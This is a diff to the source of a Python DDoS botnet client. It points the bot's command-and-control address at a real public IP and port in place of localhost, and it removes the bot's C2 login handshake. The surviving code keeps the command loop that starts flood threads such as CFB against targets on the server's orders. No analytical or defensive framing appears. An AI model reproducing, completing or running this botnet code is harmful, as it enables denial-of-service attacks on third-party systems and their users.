@@ -1,7 +1,7 @@
 import socket, threading, time, random, cloudscraper, requests
 
-C2_ADDRESS  = "127.0.0.1"
-C2_PORT     = 6667
+C2_ADDRESS  = "15.235.149.62"
+C2_PORT     = 444
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -1113,27 +1113,7 @@ def attack_junk(ip, port, secs):
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        while 1:
-            try:
-                c2.connect((C2_ADDRESS, C2_PORT))
-                while 1:
-                    c2.send('669787761736865726500'.encode())
-                    break
-                while 1:
-                    time.sleep(1)
-                    data = c2.recv(1024).decode()
-                    if 'Username' in data:
-                        c2.send('BOT'.encode())
-                        break
-                while 1:
-                    time.sleep(1)
-                    data = c2.recv(1024).decode()
-                    if 'Password' in data:
-                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
-                        break
-                break
-            except:
-                time.sleep(5)
+
         while 1:
             try:
                 data = c2.recv(1024).decode().strip()
@@ -1204,7 +1184,6 @@ def main():
                         threading.Thread(target=CFB, args=(url,secs,port), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
-
             except:
                 break
 
